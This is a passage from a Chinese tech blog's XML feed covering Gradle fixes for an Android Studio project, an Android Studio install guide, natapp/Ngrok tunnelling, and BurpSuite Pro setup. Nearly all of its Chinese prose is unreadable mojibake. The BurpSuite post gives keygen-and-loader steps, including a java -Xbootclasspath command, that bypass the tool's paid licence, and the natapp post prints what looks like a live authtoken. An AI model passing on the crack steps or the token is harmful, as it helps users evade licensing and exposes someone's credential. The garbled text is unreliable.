ç‰ˆæœ¬æ”¯æŒçš„ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥æœ€å¥½å»å®˜ç½‘çœ‹ä¸€ä¸‹ï¼Œè¦ä¸ç„¶åƒæˆ‘ä¸€æ ·çè¯•çš„è¯ï¼Œå¯èƒ½ä¼šæŒ¤çˆ†Cç›˜ ã€‚</p><p>å®˜ç½‘ï¼š<a href="https://developer.android.google.cn/studio/releases/gradle-plugin">Android Gradle æ’ä»¶ç‰ˆæœ¬è¯´æ˜  | Android å¼€å‘è€…  | Android Developers (google.cn)</a></p><div class="table-container"><table><thead><tr><th style="text-align:left">æ’ä»¶ç‰ˆæœ¬</th><th style="text-align:left">æ‰€éœ€çš„ Gradle ç‰ˆæœ¬</th></tr></thead><tbody><tr><td style="text-align:left">1.0.0 - 1.1.3</td><td style="text-align:left">2.2.1 - 2.3</td></tr><tr><td style="text-align:left">1.2.0 - 1.3.1</td><td style="text-align:left">2.2.1 - 2.9</td></tr><tr><td style="text-align:left">1.5.0</td><td style="text-align:left">2.2.1 - 2.13</td></tr><tr><td style="text-align:left">2.0.0 - 2.1.2</td><td style="text-align:left">2.10 - 2.13</td></tr><tr><td style="text-align:left">2.1.3 - 2.2.3</td><td style="text-align:left">2.14.1 - 3.5</td></tr><tr><td style="text-align:left">2.3.0+</td><td style="text-align:left">3.3+</td></tr><tr><td style="text-align:left">3.0.0+</td><td style="text-align:left">4.1+</td></tr><tr><td style="text-align:left">3.1.0+</td><td style="text-align:left">4.4+</td></tr><tr><td style="text-align:left">3.2.0 - 3.2.1</td><td style="text-align:left">4.6+</td></tr><tr><td style="text-align:left">3.3.0 - 3.3.3</td><td style="text-align:left">4.10.1+</td></tr><tr><td style="text-align:left">3.4.0 - 3.4.3</td><td style="text-align:left">5.1.1+</td></tr><tr><td style="text-align:left">3.5.0 - 3.5.4</td><td style="text-align:left">5.4.1+</td></tr><tr><td style="text-align:left">3.6.0 - 3.6.4</td><td style="text-align:left">5.6.4+</td></tr><tr><td style="text-align:left">4.0.0+</td><td style="text-align:left">6.1.1+</td></tr><tr><td style="text-align:left">4.1.0+</td><td style="text-align:left">6.5+</td></tr><tr><td style="text-align:left">4.2.0+</td><td style="text-align:left">6.7.1+</td></tr><tr><td style="text-align:left">7.0</td><td style="text-align:left">7.0+</td></tr></tbody></table></div><p>åœ¨å‡ æ¬¡å°è¯•åï¼Œå‘ç°äº†å¯ç”¨ç‰ˆæœ¬ï¼ˆ<strong>4.0.0 - 6.1.1</strong>ï¼‰ ã€‚</p><p>åœ¨ç›¸åº”çš„é…ç½®æ–‡ä»¶é‡Œè¿›è¡Œä¿®æ”¹ ï¼Œä¿®æ”¹å®Œåç‚¹å‡» <strong>Sync Now</strong> è¿›è¡ŒåŒæ­¥ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/f3c04275f92dfc374950dd421849a9c1.png" alt="image-20210921160219213" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/299dd8853599838d4c8d26cbff4c54ae.png" alt="image-20210921160238693" style="zoom:50%;"></p><p>3ï¼‰é‡æ–°æ„å»ºä¹‹åæœ‰è­¦å‘Šï¼Œæ˜¾ç¤º <strong>Build Tools ç‰ˆæœ¬ä¸è¡Œ</strong>ï¼Œå°è¯•æ¢ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ”¹æˆ <strong>29.0.2</strong> ï¼Œæ”¹äº†ä¹‹åè¿˜æ˜¯æœ‰äº›è­¦å‘Šï¼Œå°è¯•å°† <strong>compileSDKVersion æ”¹ä¸º 22</strong> ï¼Œç‚¹å‡» <strong>Sync Now</strong> è¿›è¡ŒåŒæ­¥ï¼Œå°±æ²¡é—®é¢˜äº†ã€‚</p><blockquote><p>compileSDKVersion æ”¹ä¸º 22 åï¼Œå¯èƒ½ä¼šæŠ¥é”™ï¼ŒæŒ‰ç…§æç¤ºå®‰è£…ç›¸åº”çš„åŒ…å°±å¥½äº† ã€‚</p></blockquote><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/5f70f002b0d29db0e4847cf32f7b6da7.png" alt="image-20210921163317552" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/adeedac1df3b421fcd0852490bca3d1f.png" alt="image-20210921164130326" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/aedb16928afd63d5c13311da5a3cc4ba.png" alt="image-20210921205430085" style="zoom:50%;"></p><p>4ï¼‰æœ€åè¿›è¡Œè¿è¡Œï¼Œåˆ›å»ºé¡¹ç›®æ²¡é—®é¢˜ï¼Œä½†è¿è¡Œæ—¶ï¼Œè™šæ‹Ÿæœºå¯åŠ¨äº†ä½†ä¸€ç›´æ˜¾ç¤º <strong>Waiting for all target devices to come online</strong> åŒæ—¶APPç•Œé¢æ²¡æœ‰å‡ºç°ï¼Œæˆ‘çŒœæµ‹æ˜¯å†…æ ¸ä¸æ˜¯å¾ˆæ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»ä¸€å¼€å§‹ç”¨çš„ <strong>29 å†…æ ¸</strong> æ¢äº†ä¸€ä¸ª <strong>22 å†…æ ¸</strong>ï¼Œç»“æœå°±å‡ºæ¥äº† ã€‚å½“ç„¶é—®é¢˜å¯èƒ½ä¸æ˜¯è¿™ä¸ªå¯¼è‡´çš„ï¼Œè¿™é‡Œå°±ä¸å»æ·±ç©¶äº† ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/94b9711e60598ea71d4db938d8f36b89.png" alt="image-20210921205641615"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/dcded08c484043739cdcbfe8b0ac9f03.png" alt="image-20210921171913923"></p><p><img src="/2021/09/20/Code/Java/Android-Studio%E8%BF%90%E8%A1%8C%E5%B0%8F%E7%B1%B3%E4%BE%BF%E7%AD%BE/1e0e8d31716a91ac84ac78e0cf263721.png" alt="image-20210921171629739"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>å°ç±³ä¾¿ç­¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android studioå®‰è£…</title>
    <link href="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/"/>
    <url>/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="Android-studioå®‰è£…ï¼ˆWin10ï¼‰"><a href="#Android-studioå®‰è£…ï¼ˆWin10ï¼‰" class="headerlink" title="Android studioå®‰è£…ï¼ˆWin10ï¼‰"></a>Android studioå®‰è£…ï¼ˆWin10ï¼‰</h1><p>Android Studioå®˜ç½‘ï¼š<a href="https://developer.android.google.cn/studio?hl=zh-cn">Download Android Studio and SDK tools  | Android Developers (google.cn)</a></p><p>è¿™é‡Œæˆ‘å®‰è£…çš„æ˜¯ï¼š <strong>android-studio-2020.3.1.24-windows.exe</strong> ã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>åŒå‡»è¿›è¡Œå®‰è£…ï¼Œ<strong>Next</strong> -&gt; <strong>Next</strong> -&gt; <strong>Next</strong>ï¼ˆå¯ä»¥ä¿®æ”¹å®‰è£…ç›®å½•ï¼‰ -&gt; <strong>Install</strong> -&gt; <strong>Next</strong> -&gt; <strong>finish</strong> ï¼Œå®Œæˆå®‰è£…ã€‚</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>1ã€é€‰æ‹© <strong>Do not import settings</strong> ï¼Œç‚¹å‡» <strong>OK</strong> ã€‚ï¼ˆç¬¬ä¸€æ¬¡å®‰è£…æ²¡ä»€ä¹ˆé…ç½®æ–‡ä»¶éœ€è¦å¯¼å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä¸å¯¼å…¥ï¼‰</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/48bfd903e65e84cd715a1dfb938dcaf6.bmp" alt="capture_20210920155637708" style="zoom:80%;"></p><p>2ã€é€‰æ‹© <strong>Donâ€™t sent</strong> ã€‚ ï¼ˆé€‰æ‹©ä¸å‘é€ï¼Œå› ä¸ºå¯èƒ½è¿ä¸ä¸ŠGoogleï¼Œå¯¼è‡´åå°ä¸€ç›´åœ¨è¯·æ±‚ï¼‰</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/a9963640c87bd594fefa64fc0d2b89d0.png" alt="image-20210920155740802" style="zoom:67%;"></p><p>3ã€é€‰æ‹© <strong>Cancel</strong> ã€‚ï¼ˆæ˜¾ç¤ºæ²¡æ‰¾åˆ°SDKï¼Œè¿™é‡Œå…ˆä¸ç®¡ï¼Œåé¢å†å®‰è£…ï¼‰</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/6d63b9a3a61bfef5d61eafaed1c4ed52.png" alt="image-20210920155811855"></p><p>4ã€ç‚¹å‡» <strong>Next</strong> ï¼Œé€‰æ‹© <strong>Custom</strong> ï¼Œç‚¹å‡» <strong>Next</strong> ã€‚ï¼ˆè¿™é‡Œæˆ‘é€‰æ‹©è‡ªå®šä¹‰ï¼Œæ ‡å‡†çš„è¯ä¸€äº›ä¸œè¥¿ä¸éœ€è¦é…ç½®ï¼Œä½†æ˜¯SDKå¯èƒ½ä¼šå®‰è£…åˆ°Cç›˜ï¼‰</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/153daf381fe09e1885943abb6d8548de.png" alt="image-20210920160252155" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/8ee8ffe8975a1dcd0a7d82283479214a.png" alt="image-20210920160326710" style="zoom:50%;"></p><p> 5ã€é€‰æ‹© <strong>jdk</strong> ï¼Œè¿™é‡Œæˆ‘é€‰æ‹© <strong>Android Studio</strong> è‡ªå¸¦çš„ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€‰æ‹©è‡ªå·±ä¸‹è½½çš„ ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/cdc6d2e77ba5f672c7b05440c301ef6b.png" alt="image-20210920161126051" style="zoom:50%;"></p><p>6ã€å®‰è£… <strong>SDK</strong> ï¼Œå»ºè®®å…¨é€‰å§ï¼Œå…å¾—åé¢å†å®‰è£…éº»çƒ¦ï¼Œå½“ç„¶ç°åœ¨ä¸å®‰è£…åé¢è¿˜å¯ä»¥å®‰è£… ã€‚å®‰è£…ç›®å½•å¯ä»¥æ›´æ”¹ä¸€ä¸‹ã€‚</p><blockquote><p>å¯èƒ½ä¼šå‡ºç°æœ‰äº›é€‰é¡¹é€‰ä¸ä¸Šï¼Œé‚£å°±ä¸é€‰äº†ï¼Œä¸ç”¨æ‹…å¿ƒï¼Œåé¢ä¼šæç¤ºä½ å®‰è£…çš„ï¼Œç‚¹å‡»ä¸‹è½½å°±å¥½äº† ã€‚</p></blockquote><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/014f27be92b43b28cbb349a9ee1bd151.png" alt="image-20210920171813558" style="zoom:50%;"></p><p>7ã€é»˜è®¤å°±å¥½ï¼Œ<strong>Next</strong> ï¼Œç­‰å¾…å®‰è£…å®Œæˆï¼Œ<strong>Finish</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/061750dfb84f74aaaf24b27e0677460b.png" alt="image-20210920171831534" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/84644f8c81ba85fe535a8653766a80fb.png" alt="image-20210920172458074" style="zoom:50%;"></p><h2 id="æ–°å»ºé¡¹ç›®"><a href="#æ–°å»ºé¡¹ç›®" class="headerlink" title="æ–°å»ºé¡¹ç›®"></a>æ–°å»ºé¡¹ç›®</h2><p>1ã€é€‰æ‹© <strong>New Project</strong> æ–°å»ºå·¥ç¨‹ï¼Œé€‰æ‹© <strong>Empty Activity</strong> ï¼Œ<strong>Next</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/5753cb8470c3a80fbc5c34a24e3e4680.png" alt="image-20210920185303147" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/bf09e6aa08269fd359b50b25f0b63da4.png" alt="image-20210920185321543" style="zoom:50%;"></p><p>2ã€å¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œ<strong>Finish</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/b64ffc7dd1c7167686b432b0a0f463c9.bmp" alt="capture_20210920185530531" style="zoom:50%;"></p><p>3ã€ç­‰å¾… <strong>Gradle</strong> æ„å»ºå®Œæˆï¼Œå¯èƒ½ä¼šæŠ¥é”™ ï¼ŒæŒ‰ç…§æç¤º<strong>å®‰è£…ä¸¢å¤±çš„ SDK åŒ…</strong> ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/dee0a6c0f0d5f7d0bdfdcf17fe54d67d.png" alt="QQå›¾ç‰‡20210921143209"></p><p>4ã€å®Œæˆ ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/4a6158564d4519475597b5830cd5d38a.png" alt="image-20210920190423180" style="zoom:50%;"></p><h2 id="æ·»åŠ è™šæ‹Ÿæœº"><a href="#æ·»åŠ è™šæ‹Ÿæœº" class="headerlink" title="æ·»åŠ è™šæ‹Ÿæœº"></a>æ·»åŠ è™šæ‹Ÿæœº</h2><blockquote><p>è¿™é‡Œå¯ä»¥é€šè¿‡è¿æ¥æ‰‹æœºç›´æ¥è¿›è¡Œæµ‹è¯•ï¼Œä»è€Œè·³è¿‡æ·»åŠ è™šæ‹Ÿæœº ã€‚</p></blockquote><p>1ã€æ‰¾åˆ°ä¸‹å›¾å€’æ•°ç¬¬äºŒä¸ª <strong>AVD Manager</strong>ï¼Œå•å‡»æ‰“å¼€</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/a619b8678d15bc3ccb1e7e51503ec151.png" alt="image-20210920215908969"></p><p>2ã€å•å‡» <strong>Create Virtual Devices</strong> æ·»åŠ è™šæ‹Ÿæœº ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/b8e79f3fd6eecf767579118f08b5b132.png" alt="image-20210920202253997" style="zoom:50%;"></p><p>3ã€é€‰æ‹©æœºå‹å’Œç³»ç»Ÿå†…æ ¸ï¼ˆç³»ç»Ÿå†…æ ¸éœ€è¦ä¸‹è½½ï¼Œé€‰æ‹©æƒ³ç”¨çš„ç‚¹ <strong>Download</strong> ä¸‹è½½å°±å¯ï¼‰</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/5b358da803c9d18e2654bbd1285da0c4.png" alt="image-20210920202349166" style="zoom:50%;"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/cf2ac8d3d94c52c4d610bdc5158c9ae1.png" alt="image-20210920203219851" style="zoom:50%;"></p><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>ç‚¹å‡»<strong>å°é”¤å­</strong>è¿›è¡Œåˆ›å»ºå·¥ç¨‹ï¼Œç‚¹å‡»<strong>ä¸‰è§’å½¢</strong>è¿›è¡Œè¿è¡Œï¼Œå¾—åˆ°è¿è¡Œåœ¨è™šæ‹Ÿæ‰‹æœºä¸Šçš„æ•ˆæœ ã€‚</p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/05ed62b40e371d4c97b9ff099f186194.png" alt="image-20210920203307743"></p><p><img src="/2021/09/20/Code/Java/Android-studio%E5%AE%89%E8%A3%85/bfce8344ef05cd8181b36e9a77299f6b.png" alt="image-20210920203426338" style="zoom:50%;"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Android studio</tag>
      
      <tag>win10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é€šè¿‡å¤–ç½‘è®¿é—®Javaæœ¬åœ°çš„é¡¹ç›®-å†…ç½‘ç©¿é€</title>
    <link href="/2021/09/20/Code/Java/%E9%80%9A%E8%BF%87%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AEJava%E6%9C%AC%E5%9C%B0%E7%9A%84%E9%A1%B9%E7%9B%AE-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2021/09/20/Code/Java/%E9%80%9A%E8%BF%87%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AEJava%E6%9C%AC%E5%9C%B0%E7%9A%84%E9%A1%B9%E7%9B%AE-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="é€šè¿‡å¤–ç½‘è®¿é—®Javaæœ¬åœ°çš„é¡¹ç›®-å†…ç½‘ç©¿é€"><a href="#é€šè¿‡å¤–ç½‘è®¿é—®Javaæœ¬åœ°çš„é¡¹ç›®-å†…ç½‘ç©¿é€" class="headerlink" title="é€šè¿‡å¤–ç½‘è®¿é—®Javaæœ¬åœ°çš„é¡¹ç›®-å†…ç½‘ç©¿é€"></a>é€šè¿‡å¤–ç½‘è®¿é—®Javaæœ¬åœ°çš„é¡¹ç›®-å†…ç½‘ç©¿é€</h1><p>ä¸€èˆ¬è‡ªå·±åœ¨ç”µè„‘ä¸Šå†™äº†ä¸€ä¸ªé¡¹ç›® ï¼Œä½†å¦‚æœä¸å‘å¸ƒçš„è¯å°±åªæœ‰è‡ªå·±çš„æœ¬åœ°æœåŠ¡èƒ½è®¿é—®åˆ° ï¼Œé‚£å¦‚æœéœ€è¦ç»™åˆ«äººè®¿é—®å°±éœ€è¦ä¸€ä¸ªåŸŸåå’ŒæœåŠ¡å™¨ ï¼Œå½“ç„¶è¿™æ˜¯éœ€è¦æˆæœ¬çš„ã€‚</p><h2 id="ä¸€ã€natapp"><a href="#ä¸€ã€natapp" class="headerlink" title="ä¸€ã€natapp"></a>ä¸€ã€natapp</h2><p><a href="https://natapp.cn/">NATAPP-å†…ç½‘ç©¿é€ åŸºäºngrokçš„å›½å†…é«˜é€Ÿå†…ç½‘æ˜ å°„å·¥å…·</a></p><h3 id="1ã€æ³¨å†Œç”¨æˆ·"><a href="#1ã€æ³¨å†Œç”¨æˆ·" class="headerlink" title="1ã€æ³¨å†Œç”¨æˆ·"></a>1ã€æ³¨å†Œç”¨æˆ·</h3><h3 id="2ã€ä¸‹è½½å®¢æˆ·ç«¯"><a href="#2ã€ä¸‹è½½å®¢æˆ·ç«¯" class="headerlink" title="2ã€ä¸‹è½½å®¢æˆ·ç«¯"></a>2ã€ä¸‹è½½å®¢æˆ·ç«¯</h3><h3 id="3ã€å¤åˆ¶authtoken"><a href="#3ã€å¤åˆ¶authtoken" class="headerlink" title="3ã€å¤åˆ¶authtoken"></a>3ã€å¤åˆ¶authtoken</h3><p>ç™»é™†è¿›å»ä»¥åæŸ¥çœ‹ï¼Œæˆ‘çš„éš§é“-&gt;authtoken ã€‚å¤åˆ¶ï¼Œç­‰ä¸‹è¦åœ¨å®¢æˆ·ç«¯ç”¨åˆ°ï¼</p><h3 id="4ã€ä½¿ç”¨å‘½ä»¤ç™»å½•"><a href="#4ã€ä½¿ç”¨å‘½ä»¤ç™»å½•" class="headerlink" title="4ã€ä½¿ç”¨å‘½ä»¤ç™»å½•"></a>4ã€ä½¿ç”¨å‘½ä»¤ç™»å½•</h3><p>åœ¨cmdä¸­è¾“å…¥ï¼šnatapp -authtoken=ad6b3f11eb72f44b    </p><p>å¯ä»¥çœ‹åˆ° é‚£ä¸ª<a href="http://pebq83.natappfree.ccåŸŸåæ˜ å°„çš„æ˜¯127.0.0.1ï¼š8080">http://pebq83.natappfree.ccåŸŸåæ˜ å°„çš„æ˜¯127.0.0.1ï¼š8080</a></p><p>ç„¶åtomcat éƒ¨ç½²è‡ªå·±çš„é¡¹ç›®ï¼Œå¯åŠ¨ä»¥åï¼Œç”¨<a href="http://pebq83.natappfree.ccåŸŸååŠ ä¸Šè‡ªå·±é¡¹ç›®åç§°å°±å¯ä»¥å¤–ç½‘è®¿é—®äº†">http://pebq83.natappfree.ccåŸŸååŠ ä¸Šè‡ªå·±é¡¹ç›®åç§°å°±å¯ä»¥å¤–ç½‘è®¿é—®äº†</a></p><h2 id="äºŒã€ngrok"><a href="#äºŒã€ngrok" class="headerlink" title="äºŒã€ngrok"></a>äºŒã€ngrok</h2><p><a href="https://www.ngrok.cc/">Sunny-Ngrokå†…ç½‘è½¬å‘å†…ç½‘ç©¿é€ - å›½å†…å†…ç½‘æ˜ å°„æœåŠ¡å™¨</a></p><h3 id="1ã€æ³¨å†Œã€è´­ä¹°"><a href="#1ã€æ³¨å†Œã€è´­ä¹°" class="headerlink" title="1ã€æ³¨å†Œã€è´­ä¹°"></a>1ã€æ³¨å†Œã€è´­ä¹°</h3><p>æ³¨å†Œç™»å½•åè¿›å…¥åˆ°ä¸»é¡µï¼Œç‚¹å‡»éš§é“ç®¡ç†ä¸­çš„å¼€é€šéš§é“ ï¼Œè¿™é‡Œçš„æœåŠ¡å™¨æœ‰éœ€è¦è´­ä¹°çš„ä¹Ÿæœ‰å…è´¹çš„ ï¼Œå½“ç„¶äº†å…è´¹çš„ç½‘é€Ÿå°±æ…¢äº†ç‚¹è€Œä¸”è®¿é—®çš„äººå¤šäº†ä¹Ÿä¼šå¾ˆå¡ ï¼Œä½†æ˜¯ç”¨äºæµ‹è¯•æˆ–è€…å°†é¡¹ç›®ç»™åˆ«äººæµè§ˆè¿˜æ˜¯å¯ä»¥çš„ ï¼Œé€‰æ‹©åˆ°å…è´¹æœåŠ¡å™¨ ï¼Œç‚¹å‡»ç«‹å³è´­ä¹°ã€‚</p><p>è´­ä¹°åè¿›å…¥åˆ°è¿™é‡Œåè®®ä»€ä¹ˆçš„çœ‹ä¸ªäººå§ï¼Œéš§é“åç§°æ˜¯è‡ªå®šä¹‰çš„ ï¼Œå‰ç½®åŸŸåæ ¹æ®å®ƒçš„å¡«å†™è§„åˆ™æ¥å¡«å†™å°±å¥½äº†ï¼Œæœ¬åœ°ç«¯å£å®ƒä¸€å¼€å§‹é»˜è®¤æ˜¯127.0.0.1:80 ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹å†’å·åé¢çš„ç«¯å£å· ï¼Œæ›¿æ¢æˆè‡ªå·±æœ¬åœ°é¡¹ç›®çš„ç«¯å£å·ï¼ˆæˆ‘è¿™é‡Œæ˜¯8080ï¼‰ï¼Œåé¢ä¿©ä¸ªå¯ä»¥ä¸ç”¨ç®¡ï¼Œç‚¹å‡»ç¡®è®¤æ·»åŠ  ï¼Œ ç¡®å®šå¼€é€š</p><h3 id="2ã€ä¸‹è½½å®¢æˆ·ç«¯-1"><a href="#2ã€ä¸‹è½½å®¢æˆ·ç«¯-1" class="headerlink" title="2ã€ä¸‹è½½å®¢æˆ·ç«¯"></a>2ã€ä¸‹è½½å®¢æˆ·ç«¯</h3><p>å¼€é€šåè¿›å…¥åˆ°éš§é“ç®¡ç†ï¼Œç‚¹å‡»ä¸‹è½½ ï¼Œç‚¹è¿›å»åé€‰æ‹©ä¸è‡ªå·±ç”µè„‘ç›¸åŒ¹é…çš„ç‰ˆæœ¬ ï¼Œä¸‹è½½è§£å‹</p><h3 id="3ã€å¯åŠ¨"><a href="#3ã€å¯åŠ¨" class="headerlink" title="3ã€å¯åŠ¨"></a>3ã€å¯åŠ¨</h3><p>ç‚¹å‡»å¯åŠ¨å·¥å…· ï¼Œå¼¹å‡ºä¸€ä¸ªçª—å£ã€‚</p><p>éœ€è¦è‡ªå·±çš„å®¢æˆ·ç«¯id ï¼Œå°±æ˜¯å¼€é€šéš§é“ååˆ†é…çš„éš§é“id ï¼Œå°†éš§é“idå¤åˆ¶ç²˜è´´åˆ°å†’å·åé¢ç‚¹å‡»å›è½¦ã€‚</p><p>ç‚¹å‡»å›è½¦åå°†çº¢æ¡†å†…çš„åœ°å€å¤åˆ¶åœ¨æµè§ˆå™¨ä¸­ç²˜è´´ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>å†…ç½‘ç©¿é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BurpSuiteå®‰è£…é…ç½®</title>
    <link href="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="BurpSuiteé…ç½®æ¿€æ´»"><a href="#BurpSuiteé…ç½®æ¿€æ´»" class="headerlink" title="BurpSuiteé…ç½®æ¿€æ´»"></a>BurpSuiteé…ç½®æ¿€æ´»</h2><p>1ã€ä¸‹è½½ã€è§£å‹å®ŒæˆååŒå‡»æ‰“å¼€ <strong>burp-loader-keygen.jar</strong> ã€‚</p><blockquote><p>å·¥å…·è¿è¡Œéœ€è¦ <strong>Java</strong> ç¯å¢ƒï¼Œè¯·è‡ªè¡Œå®‰è£…ï¼Œæ­¤å¤„ä¸èµ˜è¿°ã€‚</p></blockquote><p>2ã€ä¿®æ”¹ <strong>License Text</strong> ä¸ºä»»æ„å€¼ï¼Œè¿™é‡Œæˆ‘æ”¹ä¸º <code>wzz</code> ï¼Œç‚¹å‡» <code>run</code> å¯åŠ¨ <strong>burp suite</strong> ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/14ba1793e26877052daf94e88b01a682.jpg" alt="Inkedcapture_20210919225415263_LI" style="zoom:67%;"></p><blockquote><p>å¦‚æœä¸Šè¿°æ–¹å¼æ²¡æœ‰æˆåŠŸå¯åŠ¨ <strong>burpsuite</strong>ï¼Œæ‰“å¼€ <strong>cmd</strong>ï¼Œè¿›å…¥ <strong>burp-loader-keygen.jar</strong> æ‰€åœ¨ç›®å½•ï¼Œæ‰§è¡Œ <strong>Loader Command</strong> ï¼š<code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.33.jar</code> ã€‚</p></blockquote><p>æˆåŠŸæ‰“å¼€ <strong>burpsuite</strong> ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/886d92377bff862eb57f8506fd3b28b2.png" alt="image-20210919230835974" style="zoom:67%;"></p><p>3ã€å°† <strong>Keygen</strong> ä¸­ <strong>License</strong> å¤åˆ¶ç²˜è´´åˆ° <strong>burpsuite</strong> ä¸­ï¼Œç‚¹å‡» <strong>Next</strong> ï¼Œç„¶åç‚¹å‡» <strong>Manual activation</strong> ã€‚</p><p>4ã€ç‚¹å‡» <strong>Copy request</strong> ï¼Œå°†å­—ç¬¦ä¸²ç²˜è´´åˆ° <strong>keygen</strong> çš„ <strong>Activation Request</strong> é‡Œï¼Œç„¶å <strong>Activation Response</strong> æ¡†é‡Œå°±æœ‰äº†ç»“æœï¼Œå†å¤åˆ¶ <strong>Activation Response</strong> ä¸­çš„å†…å®¹ï¼Œå°†å­—ç¬¦ä¸²ç²˜è´´åˆ° <strong>BurpSuite</strong> å‰©ä¸‹çš„é‚£ä¸ªæ¡†é‡Œï¼Œå†ç‚¹å‡» <strong>Next</strong> æ˜¾ç¤ºæ¿€æ´»æˆåŠŸï¼Œç‚¹å‡» <strong>finish</strong> å®Œæˆ ã€‚ </p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/2c20e2cdafc3cb5e58f8f958e4cfa318.png" alt="image-20210919231613926" style="zoom:50%;"></p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/9c85cf8de1ee911c7a7740909048c3e1.png" alt="image-20210919231758621" style="zoom:50%;"></p><p>5ã€ç„¶åç‚¹å‡» <strong>Next</strong> ï¼Œå†ç‚¹å‡» <strong>Start Burp</strong> ï¼Œå¾—åˆ°<strong>burpsuite</strong> ä¸»ç•Œé¢ ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/fc235d64edad2dfd92fbeedc70df17fe.png" 